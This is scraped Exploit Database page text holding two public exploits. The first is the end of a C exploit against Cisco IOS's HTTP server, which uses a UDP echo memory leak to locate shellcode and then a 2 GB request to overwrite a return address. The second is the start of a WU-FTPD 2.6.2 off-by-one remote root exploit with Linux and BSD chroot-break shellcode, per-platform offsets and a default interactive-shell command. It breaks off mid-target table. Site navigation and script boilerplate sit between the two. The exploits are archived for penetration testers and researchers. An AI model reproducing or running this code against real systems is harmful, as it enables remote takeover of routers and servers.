that.\n");return (1);}if (leak.guess==(-1)) {fprintf(stderr,"Apparently, you got a good target, but it's not one of the\n""platforms we got code for. Life sucks.\n");return (1);} else {printf("Target identified as '%s'.\n",cisco_boxes[leak.guess].name);if (cfg.verbose) {printf("Using the following code:\n");hexdump(cisco_boxes[leak.guess].code,cisco_boxes[leak.guess].codelen);}saved_guess=leak.guess;}if (leak.lastaddr == 0) {printf("The memory leak data did not contain enough information to\n""calculate the addresses correctly. The router may be busy,\n""in which case this method is likely to fail!\n");return (2);} else {printf("Calculated address in test: 0x%08X\n",leak.lastaddr);}//// Connect to HTTP server and send the first "GET "//if (HTTPpre()!=0) return 1;//// fill normal buffer//printf("Sending token50 x 0x5 + token6 ...\n");HTTPsend(token50);HTTPsend(token50);HTTPsend(token50);HTTPsend(token50);HTTPsend(token50);HTTPsend(token6);//// send enough data to overflow the counter//i=1;printf("Sending token50 x 0x28F5C28 (2 Gigabytes of data)...\n");while (i<=0x28F5C28) {if (!cfg.testmode) HTTPsend(token50);http.done+=50;i++;//// output//percent = (double)http.done / (double)0x80000000;if ( percent > lpercent+0.0001 ) {printf("%5.2f%% done\n",percent * 100);lpercent=percent;}}printf("Sending final token48 ...\n");HTTPsend(token48);//// Use infoleak to transfer code and calculate address//memset(&leak,0,sizeof(leak));if (IOSlack(cfg.leakruns,saved_guess)!=0) {fprintf(stderr,"Your target does no longer leak memory. This could have\n""several reasons, but it sure prevents you from exploiting it.\n");return (-1);} else {printf("Aquired %u addresses with our code\n",leak.addrc);if (leak.addrc<LOW_ADDR_THR) {printf( "WARNING: This is a low number of addresses.\n"" The target is probably busy!!\n");}}if (saved_guess!=leak.guess)printf("Errrmmm... your target type changed. Just so you know, \n""it's not supposed to do that\n");//// prepare the overflow buffer//printf("Selecting address, using nop sled of %u and offset in the sled of %u\n",leak.nop_sled, leak.nop_offset);if ( (retaddr=SelectAddress()) == 0) return (-1);memset(&overflow,0,sizeof(overflow));sprintf(overflow,"BB%%%02X%%%02X%%%02X%%%02X%%%02X%%%02X%%%02X%%%02X",(unsigned char)( (cisco_boxes[saved_guess].fakefp>>24)&0xFF),(unsigned char)( (cisco_boxes[saved_guess].fakefp>>16)&0xFF),(unsigned char)( (cisco_boxes[saved_guess].fakefp>> 8)&0xFF),(unsigned char)( (cisco_boxes[saved_guess].fakefp )&0xFF),(unsigned char)( (retaddr>>24)&0xFF),(unsigned char)( (retaddr>>16)&0xFF),(unsigned char)( (retaddr>> 8)&0xFF),(unsigned char)( (retaddr )&0xFF));if (cfg.verbose) hexdump(overflow,sizeof(overflow)-1);//// perform overflow and overwrite return address//printf("Sending overflow of %u bytes\n",strlen(overflow));HTTPsend(overflow);printf("Sending final HTTP/1.0\n");HTTPsend(httpend);close(http.sfd);//// all done//return 0;}void usage(char *s) {fprintf(stderr,"Usage: %s -i <interface> -d <target> [-options]\n",s);fprintf(stderr,"Options are:\n""-v Verbose mode.\n""-T Test mode, don't really exploit\n""-An Address selection strategy. Values are:\n"" 1 (random), 2 (last), 3 (smallest), 4 (highest), 5 (most frequent)\n""-tn Set timeout for info leak to n seconds\n""-Ln Set requested memory leak to n bytes\n""-Rn Set number of final leak runs to n\n");exit (1);}//// *********************** HTTP related **************************//int HTTPpre(void) {char get[] = "GET ";struct sockaddr_in sin;struct hostent *he;memset(&sin,0,sizeof(struct sockaddr_in));if ((he=gethostbyname(cfg.target))==NULL) {fprintf(stderr,"Could not resolve %s\n",cfg.target);return (-1);}sin.sin_family=AF_INET;sin.sin_port=htons(80);bcopy(he->h_addr,(char *)&sin.sin_addr,he->h_length);bzero(&(sin.sin_zero),8);if ((http.sfd=socket(PF_INET,SOCK_STREAM,IPPROTO_TCP))<0) {fprintf(stderr,"socket(TCP) error\n");return(-1);}printf("Connecting to HTTP server on %s ...\n",cfg.target);if (connect(http.sfd,(struct sockaddr *)&sin,sizeof(sin))<0) {fprintf(stderr,"Failed to connect to HTTP\n");return (-1);}printf("Connected!\n");//// send "GET "//HTTPsend(get);return 0;}void HTTPsend(char *what) {if (send(http.sfd,what,strlen(what),0)<0) {fprintf(stderr,"send() failed!\n");exit(-1);}}//// *********************** UDP related **************************//int IOSlack(unsigned int runs, int shellcode) {//// the leak packet//#define DUMMY_SIZE 512unsigned char *packet;unsigned int length;char dummy[DUMMY_SIZE];unsigned char *sc,*st;unsigned int sclen;//// recv stuff//char *rbuf;unsigned int rx;//// doing the stuff//unsigned int r;struct sockaddr_in frm;int frmlen=sizeof(struct sockaddr_in);fd_set rfds;struct timeval tv;int select_ret;int recvflag;struct sockaddr_in myself;//// init//leak.guess=(-1);r=runs;recvflag=0;st=NULL;//// get the sockets//if ( (leak.sfd=init_socket_IP4(cfg.device,1)) == (-1) ) {fprintf(stderr,"Couldn't grab a raw socket\n");return (-1);}myself.sin_family=AF_INET;myself.sin_port=htons(LOCALPORT);myself.sin_addr.s_addr=INADDR_ANY;if ( (leak.udpsfd=socket(PF_INET,SOCK_DGRAM,IPPROTO_UDP)) <0) {fprintf(stderr,"Couldn't grab a UDP socket\n");return (-1);}if ( bind(leak.udpsfd,(struct sockaddr *)&myself,sizeof(struct sockaddr)) != 0) {fprintf(stderr,"bind() failed\n");return (-1);}//// determine packet contents and make a packet//if (shellcode==(-1)) {memset(&dummy,0x50,DUMMY_SIZE-1);dummy[DUMMY_SIZE-1]=0x00;sc=dummy;sclen=DUMMY_SIZE-1;} else {unsigned char *t;unsigned int i;t=sc=st=smalloc(PACKETMAX);//// calculate the remaining space for nops//leak.nop_sled=PACKETMAX-cisco_boxes[shellcode].codelen;//// align//while ( (leak.nop_sled % cisco_boxes[shellcode].noplen) != 0)leak.nop_sled--;for (i=0;i< (leak.nop_sled/cisco_boxes[shellcode].noplen) ;i++) {memcpy(t,cisco_boxes[shellcode].nop,cisco_boxes[shellcode].noplen);t+=cisco_boxes[shellcode].noplen;}//// add the real code//memcpy(t,cisco_boxes[shellcode].code,cisco_boxes[shellcode].codelen);t+=cisco_boxes[shellcode].codelen;sclen=leak.nop_sled + cisco_boxes[shellcode].codelen;//// calculate a nop_offset and align//leak.nop_offset=leak.nop_sled * 0.8;while ( (leak.nop_offset % cisco_boxes[shellcode].noplen) != 0)leak.nop_offset--;if (cfg.verbose) hexdump(st,sclen);}packet=UDPecho(&length,sc,sclen);//// allocate receive buffer//rbuf=smalloc(cfg.leakme+0x200);//// do it//printf("Getting IO memory leak data (%u times) ...\n",r);while (r--) {sendpack_IP4(leak.sfd,packet,length);tv.tv_sec=cfg.timeout;tv.tv_usec=0;FD_ZERO(&rfds);FD_SET(leak.udpsfd,&rfds);select_ret=select(leak.udpsfd+1,&rfds,NULL,NULL,&tv);if (select_ret>0) {rx=recvfrom(leak.udpsfd,rbuf,cfg.leakme,0,(struct sockaddr *)&frm,&frmlen);if (rx<0) {fprintf(stderr,"UDP recvfrom() failed\n");return (-1);}if (cfg.verbose) printf("Received %u bytes data\n",rx);if (cfg.verbose>1) hexdump(rbuf,rx);recvflag=1;//// analyze what we got//UDPanalyze(rbuf,rx,sc,sclen);} else {printf("Timeout at %u - may be lost packet?\n",r);}}//// clean up//free(packet);free(rbuf);if (st!=NULL) free(st);close(leak.sfd);close(leak.udpsfd);if (cfg.verbose==0) printf("\n"); // be niceif (recvflag) { return 0; } else { return 1; }}unsigned char *UDPecho(unsigned int *plen, // returned length of packetunsigned char *payload, // pointer to payloadunsigned int payload_len // length of payload) {unsigned char *pack;iphdr_t *ip;udphdr_t *udp;u_char *pay;u_char *t;u_int16_t cs;*plen=sizeof(iphdr_t)+sizeof(udphdr_t)+payload_len;pack=smalloc(*plen+10);ip=(iphdr_t *)pack;ip->version=4;ip->ihl=sizeof(iphdr_t)/4;ip->ttl=0x80;ip->protocol=IPPROTO_UDP;memcpy(&(ip->saddr.s_addr),&(packet_ifconfig.ip.s_addr),IP_ADDR_LEN);memcpy(&(ip->daddr.s_addr),&(cfg.target_addr),IP_ADDR_LEN);udp=(udphdr_t *)((void *)ip+sizeof(iphdr_t));udp->sport=htons(LOCALPORT);udp->dport=htons(7);udp->length=htons(cfg.leakme);pay=(u_char *)((void *)udp+sizeof(udphdr_t));t=pay;memcpy(pay,payload,payload_len);t+=payload_len;ip->tot_len=htons(*plen);cs=chksum((u_char *)ip,sizeof(iphdr_t));ip->check=cs;if (cfg.verbose>1) hexdump(pack,*plen);return pack;}void UDPanalyze(unsigned char *b, unsigned int len,unsigned char *expected, unsigned int expected_length) {#define ST_MAGIC 1#define ST_PID 2#define ST_CHECK 3#define ST_NAME 4#define ST_PC 5#define ST_NEXT 6#define ST_PREV 7#define ST_SIZE 8#define ST_REF 9#define ST_LASTDE 10#define ST_ID_ME_NOW 100unsigned char *p;int state=0;int i=0;unsigned char *opcode_begin;unsigned char *block2_next_field;unsigned int block3_next_val;unsigned int p_name;unsigned int p_pc;unsigned int p_next;unsigned int p_prev;opcode_begin=NULL;block2_next_field=NULL;block3_next_val=0;if ((!memcmp(b,expected,expected_length))) {if (cfg.verbose>1) printf("Payload found!\n");opcode_begin=b;}p=b;while ((b+len-4)>p) {if ( (p[0]==0xfd) && (p[1]==0x01) && (p[2]==0x10) && (p[3]==0xDF) ) {if (cfg.verbose>1) printf("REDZONE MATCH!\n");else { printf("!"); fflush(stdout); }state=ST_MAGIC;p+=4;}switch (state) {case ST_MAGIC:if (cfg.verbose)printf("MEMORY BLOCK\n");state++;p+=4;break;case ST_PID:if (cfg.verbose)printf("\tPID : %08X\n",ntohl(*(unsigned int *)p));state++;p+=4;break;case ST_CHECK:if (cfg.verbose)printf("\tAlloc Check: %08X\n",ntohl(*(unsigned int *)p));state++;p+=4;break;case ST_NAME:p_name=ntohl(*(unsigned int *)p);if (cfg.verbose)printf("\tAlloc Name : %08X\n",p_name);state++;p+=4;break;case ST_PC:p_pc=ntohl(*(unsigned int *)p);if (cfg.verbose)printf("\tAlloc PC : %08X\n",p_pc);state++;p+=4;break;case ST_NEXT:p_next=ntohl(*(unsigned int *)p);if (cfg.verbose)printf("\tNEXT Block : %08X\n",p_next);if (block2_next_field==NULL) {if (cfg.verbose) printf("Assigning as block2_next_field\n");block2_next_field=p;} else if (block3_next_val==0) {if (cfg.verbose) printf("Assigning as block3_next_val\n");block3_next_val=p_next;}state++;p+=4;break;case ST_PREV:p_prev=ntohl(*(unsigned int *)p);if (cfg.verbose)printf("\tPREV Block : %08X\n",p_prev);state++;p+=4;break;case ST_SIZE:if (cfg.verbose)printf("\tBlock Size : %8u words",ntohl(*(unsigned int *)p)&0x7FFFFFFF);if (ntohl(*(unsigned int *)p)&0x80000000) {if (cfg.verbose)printf(" (Block in use)\n");} else {if (cfg.verbose)printf(" (Block NOT in use)\n");}state++;p+=4;break;case ST_REF:if (cfg.verbose)printf("\tReferences : %8u\n",ntohl(*(unsigned int *)p));state++;p+=4;break;case ST_LASTDE:if (cfg.verbose)printf("\tLast DeAlc : %08X\n",ntohl(*(unsigned int *)p));state=ST_ID_ME_NOW;p+=4;break;//// Identification//case ST_ID_ME_NOW:i=0;while ((leak.guess==-1)&&(cisco_boxes[i].name!=NULL)) {if ((p_name>=cisco_boxes[i].PC_start) &&(p_name<=cisco_boxes[i].PC_end) &&(p_pc>=cisco_boxes[i].PC_start) &&(p_pc<=cisco_boxes[i].PC_end) &&(p_next>=cisco_boxes[i].IO_start) &&(p_next<=cisco_boxes[i].IO_end) &&(p_prev>=cisco_boxes[i].IO_start) &&(p_prev<=cisco_boxes[i].IO_end)) {leak.guess=i;break;}i++;}state=0;p+=4;break;default:p+=1;}}if ( (opcode_begin!=NULL) && (block2_next_field!=NULL) && (block3_next_val!=0) ) {unsigned int delta;unsigned int a;unsigned int i;int flag=0;delta=(unsigned int)((void*)block2_next_field - (void*)opcode_begin);a=block3_next_val-delta;if (cfg.verbose) {printf("\n");printf("Delta between opcode_begin (%p) ""and block2_next_field (%p) is %u\n",(void*)block2_next_field, (void*)opcode_begin, delta);printf("The third block is at 0x%08X\n", block3_next_val);printf("Therefore, the code should be located at 0x%08X\n",a);}for (i=0;i<leak.addrc;i++) {if (leak.addrs[i].a==a) {leak.addrs[i].count++;flag++;break;}}if ((flag==0)&&(leak.addrc<MAXADDRS-1)) {leak.addrs[leak.addrc++].a=a;leak.addrs[leak.addrc].count=1;leak.lastaddr=a;}}}unsigned int SelectAddress(void) {unsigned int the_address;int rnd_addr;unsigned int i,j;addrs_t atmp;addrs_t consider[MAXADDRS];unsigned int consc=0;if (leak.addrc==0) {fprintf(stderr,"ERROR: No addresses available. Unable to recover\n");return 0;}for (i=0;i<leak.addrc;i++)printf(" Address 0x%08X (%u times)\n",leak.addrs[i].a,leak.addrs[i].count);//// put addresses to consider in another array.// We only want those above our threshold, to prevent irregular buffers//memset(&consider,0,sizeof(consider));for (i=0;i<leak.addrc;i++) {if (leak.addrs[i].count<LOW_COUNT_THR) {printf("Address 0x%08X count below threshold\n",leak.addrs[i].a);continue;}consider[consc]=leak.addrs[i];consc++;}//// bubble sort addresses, unless we are operating count based, where we// sort by times of appearences//if (cfg.strategy != S_FREQUENT) {for (i=0;i<consc-1;i++) {for (j=0;j<(consc-1-i);j++) {if (consider[j+1].a < consider[j].a) {atmp=consider[j];consider[j] = consider[j+1];consider[j+1] = atmp;}}}} else {for (i=0;i<consc-1;i++) {for (j=0;j<(consc-1-i);j++) {if (consider[j+1].count < consider[j].count) {atmp=consider[j];consider[j] = consider[j+1];consider[j+1] = atmp;}}}}printf("Cleaned up, remaining addresses %u\n",consc);if (consc==0) {fprintf(stderr,"ERROR: No addresses left. Unable to recover\n""You can try to decrease LOW_COUNT_THR in the source\n");return 0;}for (i=0;i<consc;i++)printf(" Address 0x%08X (%u times)\n",consider[i].a,consider[i].count);switch (cfg.strategy) {case S_RANDOM:{srand((unsigned long)time(NULL));rnd_addr=(int)(((float)consc-1)*rand()/(RAND_MAX+1.0));the_address=consider[rnd_addr].a + leak.nop_offset;printf("Use pseudo-randomly selected address 0x%08X (0x%08X)\n",the_address,consider[rnd_addr].a);}break;case S_LAST:{the_address=leak.lastaddr + leak.nop_offset;printf("Using last address 0x%08X\n",the_address);}break;case S_SMALLEST:{if (consc==1) {the_address= consider[0].a + leak.nop_offset;printf("Using smallest address 0x%08X (0x%08X)\n",the_address,consider[0].a);} else if (consc==2) {the_address= consider[1].a + leak.nop_offset;printf("Using second smallest address 0x%08X (0x%08X)\n",the_address,consider[1].a);} else {the_address= consider[2].a + leak.nop_offset;printf("Using third smallest address 0x%08X (0x%08X)\n",the_address,consider[2].a);}}break;case S_HIGHEST:{the_address= consider[consc-1].a + leak.nop_offset;printf("Using highest address 0x%08X (0x%08X)\n",the_address,consider[consc-1].a);}break;case S_FREQUENT:{// already sorted by frequencythe_address= consider[consc-1].a + leak.nop_offset;printf("Using most frequent address 0x%08X (0x%08X)\n",the_address,consider[consc-1].a);}break;default:fprintf(stderr,"ERROR: unknown address strategy selected\n");return (0);}return the_address;}// milw0rm.com [2003-08-10]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 78
WU-FTPD 2.6.2 - Remote Command Execution - Linux remote Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDWU-FTPD 2.6.2 - Remote Command ExecutionEDB-ID:78CVE:2003-0466EDB Verified:Author:Xpl017ElzType:remoteExploit:/Platform:LinuxDate:2003-08-11Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED/***** wu-ftpd v2.6.2 off-by-one remote 0day exploit.**** exploit by "you dong-hun"(Xpl017Elz), <szoahc@hotmail.com>.**** Update:**         [v0.0.2] August 2, I added wu-ftpd-2.6.2, 2.6.0, 2.6.1 finally.**         [v0.0.3] August 3, Brute-Force function addition.**         [v0.0.4] August 4, Added FreeBSD, OpenBSD version wu-ftpd-2.6.x exploit.**                                    It will be applied well to most XxxxBSD.**         [v0.0.5] August 4, Remote scan & exploit test function addition.**                     August 6, Cleaning.***/#define VERSION "v0.0.5"#include <stdio.h>#include <unistd.h>#include <stdlib.h>#include <netdb.h>#include <netinet/in.h>#include <sys/socket.h>#define DEBUG_NG#undef DEBUG_NG#define NRL 0#define SCS 1#define FAD (-1)#define MAX_BF (16)#define BF_LSZ (0x100) /* 256 */#define DEF_VA 255#define DEF_PORT 21#define DEF_ANSH_LINUX 15#define DEF_ANSH_FRBSD 55#define GET_HOST_NM_ERR (NULL)#define SIN_ZR_SIZE 8#define DEF_ALIGN 4#define GET_R 5000#define DEF_NOP 64#define DEF_STR "x0x"#define HOME_DIR_LINUX "/home/"#define HOME_DIR_FRBSD "/usr/home/"#define HOME_DIR_OPBSD "/home/"#define DEF_HOST "localhost"#define DEF_COMM "echo \"x82 is happy, x82 is happy, x82 is happy\";" \"uname -a;id;export TERM=vt100;exec bash -i\n"#define DEF_COMM_OB "echo \"x82 is happy, x82 is happy, x82 is happy\";" \"uname -a;id;export TERM=vt100;exec sh -i\n"/* ftpd handshake */#define FTP_CONN_SCS "220"#define FTP_USER_FAD "331"#define FTP_LOGIN_FAD "530 Login incorrect."#define FTP_LOGIN_SCS "230"#define CWD_COMM_SCS "250" /* also, RMD command */#define MKD_COMM_SCS "257"#define MKD_EXIST "521"#define CMD_ERROR "500"void ftpd_login(int sock,char *user,char *pass);void conn_shell(int conn_sock,u_long scs_addr);int setsock(char *u_host,int u_port);void re_connt(int st_sock_va);void prcode_usage(char *f_nm);int mkd_cwd_f(int sock,int type,char *dir_nm,int gb_character);int send_shellcode(int sock,int type,char *dir_nm);void make_send_exploit(int sock,int type,u_long sh_addr,int d_type);int make_retloc(int sock,int type,char *atk_bf,u_long sh_addr);u_long null_chk(u_long sh_addr);void banrl();int bscann(char *chk_ban);int check_exp(int sock);struct os{int num;char *v_nm;u_long sh_addr;u_long bf_addr;char *shellcode;int off_st;char *home;};int t_g=(NRL);char home_dir[(DEF_VA)]; /* user home directory offset */int __exp_test=(NRL); /* check exploit test */int b_scan=(NRL); /* banner check *//*** `0xff' uses two times to be realized in our shellcode.*/char lnx_shellcode_ffx2[]=/* setuid/chroot-break/execve shellcode by Lam3rZ */"\x31\xc0\x31\xdb\x31\xc9\xb0\x46\xcd\x80\x31\xc0\x31\xdb\x43\x89""\xd9\x41\xb0\x3f\xcd\x80\xeb\x6b\x5e\x31\xc0\x31\xc9\x8d\x5e\x01""\x88\x46\x04\x66\xb9\xff\xff\x01\xb0\x27\xcd\x80\x31\xc0\x8d\x5e\x01""\xb0\x3d\xcd\x80\x31\xc0\x31\xdb\x8d\x5e\x08\x89\x43\x02\x31\xc9""\xfe\xc9\x31\xc0\x8d\x5e\x08\xb0\x0c\xcd\x80\xfe\xc9\x75\xf3\x31""\xc0\x88\x46\x09\x8d\x5e\x08\xb0\x3d\xcd\x80\xfe\x0e\xb0\x30\xfe""\xc8\x88\x46\x04\x31\xc0\x88\x46\x07\x89\x76\x08\x89\x46\x0c\x89""\xf3\x8d\x4e\x08\x8d\x56\x0c\xb0\x0b\xcd\x80\x31\xc0\x31\xdb\xb0""\x01\xcd\x80\xe8\x90\xff\xff\xff\xff\xff\xff\x30\x62\x69\x6e\x30\x73\x68\x31""\x2e\x2e\x31\x31";char bsd_shellcode_ffx2[]=/* Lam3rZ chroot() code rewritten for FreeBSD by venglin */"\x31\xc0\x50\x50\x50\xb0\x7e\xcd\x80\x31\xdb\x31\xc0\x43""\x43\x53\x4b\x53\x53\xb0\x5a\xcd\x80\xeb\x77\x5e\x31\xc0""\x8d\x5e\x01\x88\x46\x04\x66\x68\xff\xff\x01\x53\x53\xb0\x88""\xcd\x80\x31\xc0\x8d\x5e\x01\x53\x53\xb0\x3d\xcd\x80\x31""\xc0\x31\xdb\x8d\x5e\x08\x89\x43\x02\x31\xc9\xfe\xc9\x31""\xc0\x8d\x5e\x08\x53\x53\xb0\x0c\xcd\x80\xfe\xc9\x75\xf1""\x31\xc0\x88\x46\x09\x8d\x5e\x08\x53\x53\xb0\x3d\xcd\x80""\xfe\x0e\xb0\x30\xfe\xc8\x88\x46\x04\x31\xc0\x88\x46\x07""\x89\x76\x08\x89\x46\x0c\x89\xf3\x8d\x4e\x08\x8d\x56\x0c""\x52\x51\x53\x53\xb0\x3b\xcd\x80\x31\xc0\x31\xdb\x53\x53""\xb0\x01\xcd\x80\xe8\x84\xff\xff\xff\xff\xff\xff\x30\x62\x69\x6e\x30""\x73\x68\x31\x2e\x2e\x31\x31\x76\x65\x6e\x67\x6c\x69\x6e""\x40\x6b\x6f\x63\x68\x61\x6d\x2e\x6b\x61\x73\x69\x65\x2e""\x63\x6f\x6d";struct os plat[]={/*** I enjoy version up, will not share more. :-}*/{0,"RedHat Linux 6.x Version wu-2.6.0 compile",0x0806a59c,0x0806a082,lnx_shellcode_ffx2,(DEF_ANSH_LINUX),(HOME_DIR_LINUX)},{1,"RedHat Linux 6.x Version wu-2.6.1 compile",0x0806aad8,0x0806a082,lnx_shellcode_ffx2,(DEF_ANSH_LINUX),(HOME_DIR_LINUX)},{2,"RedHat Linux 6.x Version wu-2.6.2 compile",0x0806aa60,0x0806a082,lnx_shellcode_ffx2,(DEF_ANSH_LINUX),(HOME_DIR_LINUX)},{3,"FreeBSD 4.6.2-RELEASE Version wu-2.6.0 compile",0x0806b826,0x0806b026,bsd_shellcode_ffx2,(DEF_ANSH_FRBSD),(HOME_DIR_FRBSD)},{4,"FreeBSD 4.6.2-RELEASE Version wu-2.6.1 compile",0x0806cb36,0x0806c036,bsd_shellcode_ffx2,(DEF_ANSH_FRBSD),(HOME_DIR_FRBSD)},{5,"FreeBSD 4.6.2-RELEASE Version wu-2.6.2 